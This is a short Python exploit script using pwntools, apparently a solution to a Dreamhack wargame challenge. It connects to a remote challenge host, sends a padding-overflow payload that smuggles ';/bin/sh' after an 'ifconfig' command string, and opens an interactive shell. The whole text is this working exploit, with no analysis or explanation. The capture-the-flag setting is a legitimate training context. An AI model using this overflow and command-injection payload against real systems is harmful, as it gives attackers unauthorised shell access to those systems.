from pwn import *

p = remote("host3.dreamhack.games", 13471)
payload = b"A" * 0x20 + b"ifconfig" + b";/bin/sh"

p.send(payload)

p.interactive()